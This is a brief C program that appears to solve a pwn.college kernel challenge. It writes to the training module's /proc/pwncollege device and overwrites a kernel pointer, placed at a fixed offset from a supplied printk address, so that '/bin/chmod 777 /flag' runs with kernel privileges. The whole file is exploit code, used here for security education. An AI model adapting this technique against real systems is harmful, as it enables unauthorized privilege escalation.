#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

#define LENGTH 0x108
int main(int argc, char **argv) {
  if (argc < 2) {
   printf("Usage: %s <printk_address>\n", argv[0]);
   return 1;
  }
  unsigned long printk_addr = strtoull(argv[1], NULL, 0);

  int fd;
  if ((fd = open("/proc/pwncollege",O_RDWR)) < 0) {
    perror("open");
  }

  char fsb[LENGTH-8];
  write(fd, fsb, LENGTH-8);

  char buf[LENGTH] = "/bin/chmod 777 /flag";
  *(unsigned long*)(buf+LENGTH-8) = printk_addr - 183929;
  write(fd, buf, LENGTH);
}
